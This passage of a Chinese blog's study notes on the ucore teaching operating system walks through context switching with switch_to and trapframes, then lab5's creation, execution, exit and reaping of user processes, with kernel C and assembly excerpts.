<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct context &#123;</span><br><span class="line">    uint32_t eip;</span><br><span class="line">    uint32_t esp;</span><br><span class="line">    uint32_t ebx;</span><br><span class="line">    uint32_t ecx;</span><br><span class="line">    uint32_t edx;</span><br><span class="line">    uint32_t esi;</span><br><span class="line">    uint32_t edi;</span><br><span class="line">    uint32_t ebp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>context</code>结构体主要在<code>switch_to</code> 函数中用到，<code>switch_to</code>传入前后两个<code>context</code>的地址， <code>switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context))</code> ，具体实现如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">switch_to:                      # switch_to(from, to)</span><br><span class="line"></span><br><span class="line">    # save from&#39;s registers</span><br><span class="line">    movl 4(%esp), %eax          # eax points to from</span><br><span class="line">    popl 0(%eax)                # save eip !popl</span><br><span class="line">    movl %esp, 4(%eax)          # save esp::context of from</span><br><span class="line">    movl %ebx, 8(%eax)          # save ebx::context of from</span><br><span class="line">    movl %ecx, 12(%eax)         # save ecx::context of from</span><br><span class="line">    movl %edx, 16(%eax)         # save edx::context of from</span><br><span class="line">    movl %esi, 20(%eax)         # save esi::context of from</span><br><span class="line">    movl %edi, 24(%eax)         # save edi::context of from</span><br><span class="line">    movl %ebp, 28(%eax)         # save ebp::context of from</span><br><span class="line"></span><br><span class="line">    # restore to&#39;s registers</span><br><span class="line">    movl 4(%esp), %eax          # not 8(%esp): popped return address already</span><br><span class="line">                                # eax now points to to</span><br><span class="line">    movl 28(%eax), %ebp         # restore ebp::context of to</span><br><span class="line">    movl 24(%eax), %edi         # restore edi::context of to</span><br><span class="line">    movl 20(%eax), %esi         # restore esi::context of to</span><br><span class="line">    movl 16(%eax), %edx         # restore edx::context of to</span><br><span class="line">    movl 12(%eax), %ecx         # restore ecx::context of to</span><br><span class="line">    movl 8(%eax), %ebx          # restore ebx::context of to</span><br><span class="line">    movl 4(%eax), %esp          # restore esp::context of to</span><br><span class="line"></span><br><span class="line">    pushl 0(%eax)               # push eip</span><br><span class="line"></span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<h2 id="进程切换中使用trapframe"><a href="#进程切换中使用trapframe" class="headerlink" title="进程切换中使用trapframe"></a>进程切换中使用trapframe</h2><p>进程切换仅仅通过<code>switch_to</code>函数是不够的，<code>switch_to</code>仅仅保存、恢复了普通寄存器，无法实现优先级跳转、段寄存器修改等等。接下来的工作就需要借助<code>trapframe</code>了。</p>
<p>由于<code>switch_to</code>函数跳转后，将调到<code>context.eip</code>位置。而这个跳转我们没法完全实现进程切换，所以我们可以将其设置为一个触发二级跳转的函数的地址，即<code>forkret</code>的地址入口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proc-&gt;context.eip &#x3D; (uintptr_t)forkret;</span><br><span class="line">proc-&gt;context.esp &#x3D; (uintptr_t)(proc-&gt;tf);</span><br></pre></td></tr></table></figure>
<p><code>forkret</code>函数定义如下，将当前进程的<code>trapframe</code>作为参数传入来切换进程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">forkret(<span class="keyword">void</span>) &#123;</span><br><span class="line">    forkrets(current-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>forkrets</code>的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.globl __trapret</span><br><span class="line">__trapret:</span><br><span class="line">    # restore registers from stack</span><br><span class="line">    popal</span><br><span class="line"></span><br><span class="line">    # restore %ds, %es, %fs and %gs</span><br><span class="line">    popl %gs</span><br><span class="line">    popl %fs</span><br><span class="line">    popl %es</span><br><span class="line">    popl %ds</span><br><span class="line"></span><br><span class="line">    # get rid of the trap number and error code</span><br><span class="line">    addl $0x8, %esp</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line">.globl forkrets</span><br><span class="line">forkrets:</span><br><span class="line">    # set stack to this new process&#39;s trapframe</span><br><span class="line">    movl 4(%esp), %esp</span><br><span class="line">    jmp __trapret</span><br></pre></td></tr></table></figure>
<p>然后再次回到中断恢复部分的代码，而其中的逻辑也完全相同。最终，进程跳转到目标进程的入口，而该入口的地址，被存放在<code>proc-&gt;tf</code>中。切换后进程对应的<code>trapframe</code>在<code>kernel_thread</code>函数中设置，将调用函数入口<code>fn</code>被储存在了<code>eip</code>中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">kernel_thread(<span class="keyword">int</span> (*fn)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg, <span class="keyword">uint32_t</span> clone_flags) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    tf.tf_cs = KERNEL_CS;</span><br><span class="line">    tf.tf_ds = tf.tf_es = tf.tf_ss = KERNEL_DS;</span><br><span class="line">    tf.tf_regs.reg_ebx = (<span class="keyword">uint32_t</span>)fn;</span><br><span class="line">    tf.tf_regs.reg_edx = (<span class="keyword">uint32_t</span>)arg;</span><br><span class="line">    tf.tf_eip = (<span class="keyword">uint32_t</span>)kernel_thread_entry;</span><br><span class="line">    <span class="keyword">return</span> do_fork(clone_flags | CLONE_VM, <span class="number">0</span>, &amp;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>ucore</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab5</title>
    <url>/systems/ucore-lab5/</url>
    <content><![CDATA[<p>之前的实验均在内核态中执行，不涉及在用户态的操作，所以提供各种操作系统的内核线程只能在cpu核心态工作。然而应用程序员也需要在计算机系统上运行自己的应用软件，将应用软件都作为内核线程则无法保证系统的安全性。基于以上原因，ucore在lab5中提供用户态进程的创建和执行机制，给应用程序提供一个用户态的运行环境。</p>
<a id="more"></a>

<h1 id="创建用户进程"><a href="#创建用户进程" class="headerlink" title="创建用户进程"></a>创建用户进程</h1><h2 id="应用程序的组成和编译"><a href="#应用程序的组成和编译" class="headerlink" title="应用程序的组成和编译"></a>应用程序的组成和编译</h2><p>以hello.c程序为例，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;ulib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    cprintf(&quot;Hello world!!.\n&quot;);</span><br><span class="line">    cprintf(&quot;I am process %d.\n&quot;, getpid());</span><br><span class="line">    cprintf(&quot;hello pass.\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行make后输出如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+ cc user&#x2F;hello.c</span><br><span class="line"></span><br><span class="line">gcc -Iuser&#x2F; -fno-builtin -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs&#x2F; -Iuser&#x2F;include&#x2F; -Iuser&#x2F;libs&#x2F; -c user&#x2F;hello.c -o obj&#x2F;user&#x2F;hello.o</span><br><span class="line"></span><br><span class="line">ld -m    elf_i386 -nostdlib -T tools&#x2F;user.ld -o obj&#x2F;__user_hello.out  obj&#x2F;user&#x2F;libs&#x2F;initcode.o obj&#x2F;user&#x2F;libs&#x2F;panic.o obj&#x2F;user&#x2F;libs&#x2F;stdio.o obj&#x2F;user&#x2F;libs&#x2F;syscall.o obj&#x2F;user&#x2F;libs&#x2F;ulib.o obj&#x2F;user&#x2F;libs&#x2F;umain.o  obj&#x2F;libs&#x2F;hash.o obj&#x2F;libs&#x2F;printfmt.o obj&#x2F;libs&#x2F;rand.o obj&#x2F;libs&#x2F;string.o obj&#x2F;user&#x2F;hello.o</span><br><span class="line">……</span><br><span class="line">ld -m    elf_i386 -nostdlib -T tools&#x2F;kernel.ld -o bin&#x2F;kernel  obj&#x2F;kern&#x2F;init&#x2F;entry.o obj&#x2F;kern&#x2F;init&#x2F;init.o …… -b binary …… obj&#x2F;__user_hello.out</span><br></pre></td></tr></table></figure>
<p>在make最后一步执行了一个ld命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">把hello应用程序的执行码obj&#x2F;__user_hello.out连接在了ucore kernel的末尾。ld命令会在kernel中会把__user_hello.out的位置和大小记录在全局变量_binary_obj___user_hello_out_start和_binary_obj___user_hello_out_size中，这样这个hello用户程序就能够和ucore内核一起被 bootloader 加载到内存里中，并且通过这两个全局变量定位hello用户程序执行码的起始位置和大小。</span><br></pre></td></tr></table></figure>
<h2 id="用户进程的虚拟地址空间"><a href="#用户进程的虚拟地址空间" class="headerlink" title="用户进程的虚拟地址空间"></a>用户进程的虚拟地址空间</h2><p>在<code>tools/user.ld</code>描述了用户程序的用户虚拟空间的执行入口虚拟地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SECTIONS &#123;</span><br><span class="line">    &#x2F;* Load programs at this address: &quot;.&quot; means the current address *&#x2F;</span><br><span class="line">    . &#x3D; 0x800020;</span><br></pre></td></tr></table></figure>
<p>在<code>tools/kernel.ld</code>描述了操作系统的内核虚拟空间的起始入口虚拟地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SECTIONS &#123;</span><br><span class="line">    &#x2F;* Load the kernel at this address: &quot;.&quot; means the current address *&#x2F;</span><br><span class="line">    . &#x3D; 0xC0100000;</span><br></pre></td></tr></table></figure>
<p>这样ucore将用户进程的虚拟地址空间分为了两个部分，一部分是所有用户进程共享的内核地址空间，映射到同样的物理地址空间中。将内核代码放到此空间中，用户进程从用户态到内核态时，内核可以统一应对不同的内核程序。另外一部分是用户虚拟地址空间，映射到不同且没有交集的物理内存空间中。用户进程的执行代码和数据放到用户地址空间时确保各个进程不会非法访问到其他进程的物理空间。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * Virtual memory map:                                          Permissions</span></span><br><span class="line"><span class="comment"> *                                                              kernel/user</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     4G ------------------&gt; +---------------------------------+</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            |         Empty Memory (*)        |</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            +---------------------------------+ 0xFB000000</span></span><br><span class="line"><span class="comment"> *                            |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span></span><br><span class="line"><span class="comment"> *     VPT -----------------&gt; +---------------------------------+ 0xFAC00000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *     KERNTOP -------------&gt; +---------------------------------+ 0xF8000000</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            |    Remapped Physical Memory     | RW/-- KMEMSIZE</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *     KERNBASE ------------&gt; +---------------------------------+ 0xC0000000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *     USERTOP -------------&gt; +---------------------------------+ 0xB0000000</span></span><br><span class="line"><span class="comment"> *                            |           User stack            |</span></span><br><span class="line"><span class="comment"> *                            +---------------------------------+</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            :                                 :</span></span><br><span class="line"><span class="comment"> *                            |         ~~~~~~~~~~~~~~~~        |</span></span><br><span class="line"><span class="comment"> *                            :                                 :</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line"><span class="comment"> *                            |       User Program &amp; Heap       |</span></span><br><span class="line"><span class="comment"> *     UTEXT ---------------&gt; +---------------------------------+ 0x00800000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *                            |  - - - - - - - - - - - - - - -  |</span></span><br><span class="line"><span class="comment"> *                            |    User STAB Data (optional)    |</span></span><br><span class="line"><span class="comment"> *     USERBASE, USTAB------&gt; +---------------------------------+ 0x00200000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *     0 -------------------&gt; +---------------------------------+ 0x00000000</span></span><br><span class="line"><span class="comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span></span><br><span class="line"><span class="comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span></span><br><span class="line"><span class="comment"> *     there if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br></pre></td></tr></table></figure>
<h2 id="创建并执行用户进程"><a href="#创建并执行用户进程" class="headerlink" title="创建并执行用户进程"></a>创建并执行用户进程</h2><p>lab5中第一个进程是由第二个内核线程<code>initproc</code>通过把hello应用程序执行码覆盖到<code>initproc</code>的用户执行空间来创建的，相关代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERNEL_EXECVE(name, binary, size) (&#123;                          \</span></span><br><span class="line">            cprintf(<span class="string">&quot;kernel_execve: pid = %d, name = \&quot;%s\&quot;.\n&quot;</span>,        \</span><br><span class="line">                    current-&gt;pid, name);                                \</span><br><span class="line">            kernel_execve(name, binary, (<span class="keyword">size_t</span>)(size));                \</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_EXECVE(x) (&#123;                                             \</span></span><br><span class="line">            <span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> _binary_obj___user_#<span class="meta">#x##_out_start[],  \</span></span><br><span class="line">                _binary_obj___user_#<span class="meta">#x##_out_size[];                    \</span></span><br><span class="line">            __KERNEL_EXECVE(<span class="meta">#x, _binary_obj___user_##x##_out_start,     \</span></span><br><span class="line">                            _binary_obj___user_#<span class="meta">#x##_out_size);         \</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERNEL_EXECVE2(x, xstart, xsize) (&#123;                           \</span></span><br><span class="line">            <span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> xstart[], xsize[];                     \</span><br><span class="line">            __KERNEL_EXECVE(<span class="meta">#x, xstart, (size_t)xsize);                 \</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_EXECVE2(x, xstart, xsize)        __KERNEL_EXECVE2(x, xstart, xsize)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// user_main - kernel thread used to exec a user program</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">user_main(<span class="keyword">void</span> *arg) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TEST</span></span><br><span class="line">    KERNEL_EXECVE2(TEST, TESTSTART, TESTSIZE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    KERNEL_EXECVE(<span class="built_in">exit</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    panic(<span class="string">&quot;user_main execve failed.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>proc_init</code>函数中，通过<code>kernel_thread</code>来创建第二个内核线程<code>init_main</code>，<code>init_main</code>又调用<code>kernel_thread</code>来创建子进程<code>user_main</code> 。user_main在缺省的情况下执行宏<code>KERNEL_EXECVE(exit);</code> ，而这个宏最后是调用<code>kernel_execve</code> 来调用SYS_execve系统调用。由于ld在链接exit应用程序执行码时定义了两全局变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_binary_obj___user_exit_out_start：exit执行码的起始位置</span><br><span class="line">_binary_obj___user_exit_out_size中：exit执行码的大小</span><br></pre></td></tr></table></figure>
<p><code>kernel_execve</code>把这两个变量作为SYS_exec系统调用的参数，让ucore来创建此用户进程。当ucore收到此系统调用后，将依次调用如下函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vector128(vectors.S)--&gt;__alltraps(trapentry.S)--&gt;trap(trap.c)--&gt;trap_dispatch(trap.c)--</span><br><span class="line">--&gt;syscall(syscall.c)--&gt;sys_exec（syscall.c）--&gt;do_execve(proc.c)</span><br></pre></td></tr></table></figure>
<p>最终通过<code>do_execve</code>函数来完成用户进程的创建工作。</p>
<p><code>do_execve</code>的流程分析如下：</p>
<p>首先为加载新的执行码做好用户态内存空间清空准备。如果mm不为NULL，则设置页表为内核空间页表，且进一步判断mm的引用计数减1后是否为0，如果为0，则表明没有进程再需要此进程所占用的内存空间，为此将根据mm中的记录，释放进程所占用户空间内存和进程页表本身所占空间。最后把当前进程的mm内存管理指针为空。由于此处的 initproc是内核线程，所以mm为NULL，整个处理都不会做。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)name, len, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; PROC_NAME_LEN) &#123;</span><br><span class="line">        len = PROC_NAME_LEN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> local_name[PROC_NAME_LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(local_name, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_name));</span><br><span class="line">    <span class="built_in">memcpy</span>(local_name, name, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>加载应用程序执行码到当前进程的新创建的用户态虚拟空间中。这里涉及到读ELF格式的文件，申请内存空间，建立用户态虚存空间，加载应用程序执行码等。<code>load_icode</code>函数完成了整个复杂的工作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int ret;</span><br><span class="line">if ((ret &#x3D; load_icode(binary, size)) !&#x3D; 0) &#123;</span><br><span class="line">goto execve_exit;</span><br><span class="line">&#125;</span><br><span class="line">set_proc_name(current, local_name);</span><br></pre></td></tr></table></figure>
<p><code>do_execv</code>函数调用<code>load_icode</code>（位于<code>kern/process/proc.c</code>中）来加载并解析一个处于内存中的ELF执行文件格式的应用程序，建立相应的用户内存空间来放置应用程序的代码段、数据段等，且要设置好<code>proc_struct</code>结构中的成员变量<code>trapframe</code>中的内容，确保在执行此进程后，能够从应用程序设定的起始执行地址开始执行。需设置正确的<code>trapframe</code>内容。</p>
<p>设置<code>trapframe</code>部分的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">load_icode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> =</span> current-&gt;tf;</span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">	tf_cs=USER_CS;</span><br><span class="line">	tf_ds=tf_es=tf_ss=USER_DS;</span><br><span class="line">	tf_esp=USTACKTOP;</span><br><span class="line">	tf_eip=elf-&gt;e_entry;</span><br><span class="line">	tf_eflags=FL_IF;<span class="comment">//使能中断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先将中断帧全部设置为0，其次修改中断帧中内容如下：</p>
<ul>
<li>tf_cs：用户态代码段寄存器，设置为USER_CS</li>
<li>tf_ds，tf_es,tf_ss:用户态数据段寄存器，设置为USER_DS</li>
<li>tf_esp：设置为宏<code>USTACKTOP</code>(用户栈)，即<strong>0xB0000000</strong></li>
<li>tf_eip：用户态的指令指针，设置为用户程序的起始位置(即user.ld中<code>0x00800020</code>）</li>
<li>tf_eflags：设置使能中断</li>
</ul>
<blockquote>
<p>描述当创建一个用户态进程并加载了应用程序后，CPU是如何让这个应用程序最终在用户态执行起来的。即这个用户态进程被ucore选择占用CPU执行（RUNNING态）到具体执行应用程序第一条指令的整个经过。</p>
</blockquote>
<p>当一个用户态进程被选择占用cpu执行后，执行<code>proc_init</code>，流程如下：</p>
<ol>
<li>关闭中断</li>
<li>将当前进程指针指向该进程</li>
<li>调用<code>switch_to</code>切换进程上下文，跳转到<code>forkrets</code></li>
<li>跳转到<code>__trapret</code>，恢复各段寄存器</li>
</ol>
<p>新建一个进程有两种方式：</p>
<ol>
<li>在用户态系统调用<code>sys_fork</code></li>
<li>在内核态函数调用<code>do_fork</code></li>
</ol>
<p>二者均会系统调用<code>sys_exec</code>来创建一个新进程，应用程序具体执行的第一条指令由<code>trapframe</code>中eip的值给定。在<code>__trapret</code>返回后即转到新进程中的第一条指令执行。</p>
<h1 id="进程退出和回收"><a href="#进程退出和回收" class="headerlink" title="进程退出和回收"></a>进程退出和回收</h1><p>进程执行完它的工作后就执行退出操作来释放进程占用的资源。进程自身无法回收所有的资源，只要进程还在执行，内核栈的空间无法释放，对应的进程控制块也无法释放，由其父进程来释放这两个资源。所以ucore首先由进程本身完成大部分资源的占用内存回收工作，然后由父进程完成剩余资源的回收工作。</p>
<p>为此在用户态函数库中提供了exit函数，访问sys_exit系统调用接口让操作系统来帮助当前进程执行退出过程中部分资源的回收。</p>
<p>进程退出操作流程如下：</p>
<p>首先sys_exit将退出码error_code传递给ucore，ucore通过执行do_exit来处理当前退出进程，回收大部分当前进程所占用的资源并通知父进程完成最后的回收工作。</p>
<p>具体流程如下：</p>
<p><strong>1.</strong> 如果current-&gt;mm != NULL，表示是用户进程，则开始回收此用户进程所占用的用户态虚拟内存空间；</p>
<p>a) 首先执行<code>lcr3(boot_cr3)</code>，切换到内核态的页表上，这样当前用户进程目前只能在内核虚拟地址空间执行了，这是为了确保后续释放用户态内存和进程页表的工作能够正常执行；</p>
<p>b) 如果当前进程控制块的成员变量mm的成员变量<code>mm_count</code>减1后为0（表明这个mm没有再被其他进程共享，可以彻底释放进程所占的用户虚拟空间了），则开始回收用户进程所占的内存资源：</p>
<p>i. 调用<code>exit_mmap</code>函数释放<code>current-&gt;mm-&gt;vma</code>链表中每个vma描述的进程合法空间中实际分配的内存，然后把对应的页表项内容清空，最后还把页表所占用的空间释放并把对应的页目录表项清空；</p>
<p>ii. 调用<code>put_pgdir</code>函数释放当前进程的页目录所占的内存；</p>
<p>iii. 调用<code>mm_destroy</code>函数释放mm中的vma所占内存，最后释放mm所占内存；</p>
<p>c) 此时设置<code>current-&gt;mm</code>为NULL，表示与当前进程相关的用户虚拟内存空间和对应的内存管理成员变量所占的内核虚拟内存空间已经回收完毕；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);</span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);</span><br><span class="line">            put_pgdir(mm);</span><br><span class="line">            mm_destroy(mm);</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><strong>2.</strong> 这时，设置当前进程的执行状态<code>current-&gt;state=PROC_ZOMBIE</code>，当前进程的退出码<code>current-&gt;exit_code=error_code</code>。此时当前进程已经不能被调度了，需要此进程的父进程来做最后的回收工作（即回收描述此进程的内核栈和进程控制块）；</p>
<p><strong>3.</strong> 如果当前进程的父进程<code>current-&gt;parent</code>处于等待子进程状态：current-&gt;parent-&gt;wait_state==WT_CHILD，则唤醒父进程（即执行“wakup_proc(current-&gt;parent)”），让父进程帮助自己完成最后的资源回收；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">current-&gt;state = PROC_ZOMBIE;</span><br><span class="line">current-&gt;exit_code = error_code;</span><br></pre></td></tr></table></figure>
<p><strong>4.</strong> 如果当前进程还有子进程，则需要把这些子进程的父进程指针设置为内核线程<code>initproc</code>，且各个子进程指针需要插入到<code>initproc</code>的子进程链表中。如果某个子进程的执行状态是<code>PROC_ZOMBIE</code>，则需要唤醒initproc来完成对此子进程的最后回收工作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> intr_flag;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">local_intr_save(intr_flag);</span><br><span class="line">&#123;</span><br><span class="line">    proc = current-&gt;parent;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;wait_state == WT_CHILD) &#123;</span><br><span class="line">        wakeup_proc(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (current-&gt;cptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc = current-&gt;cptr;</span><br><span class="line">        current-&gt;cptr = proc-&gt;optr;</span><br><span class="line"></span><br><span class="line">        proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            initproc-&gt;cptr-&gt;yptr = proc;</span><br><span class="line">        &#125;</span><br><span class="line">        proc-&gt;parent = initproc;</span><br><span class="line">        initproc-&gt;cptr = proc;</span><br><span class="line">        <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">            <span class="keyword">if</span> (initproc-&gt;wait_state == WT_CHILD) &#123;</span><br><span class="line">                wakeup_proc(initproc);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">local_intr_restore(intr_flag);</span><br></pre></td></tr></table></figure>
<p><strong>5.</strong> 执行<code>schedule()</code>函数,调度后选择新进程执行。</p>
<p>父进程通过<code>syswait</code>系统调用接口来让ucore完成最后的资源回收工作。</p>
<p><code>do_wait</code>具体流程如下：<br>**1.**如果pid!=0，表示只找一个进程id号为pid的退出状态的子进程，否则找任意一个处于退出状态的子进程；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        proc = find_proc(pid);</span><br><span class="line">        <span class="keyword">if</span> (proc != <span class="literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        proc = current-&gt;cptr;</span><br><span class="line">        <span class="keyword">for</span> (; proc != <span class="literal">NULL</span>; proc = proc-&gt;optr) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;</span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>**2.**如果此子进程的执行状态不为<code>PROC_ZOMBIE</code>，表明此子进程还没有退出，则当前进程只好设置自己的执行状态为<code>PROC_SLEEPING</code>，睡眠原因为<code>WT_CHILD</code>（即等待子进程退出），调用schedule()函数选择新的进程执行，自己睡眠等待，如果被唤醒，则重复跳回步骤1处执行；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (haskid) &#123;</span><br><span class="line">        current-&gt;state &#x3D; PROC_SLEEPING;</span><br><span class="line">        current-&gt;wait_state &#x3D; WT_CHILD;</span><br><span class="line">        schedule();</span><br><span class="line">        if (current-&gt;flags &amp; PF_EXITING) &#123;</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        &#125;</span><br><span class="line">        goto repeat;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
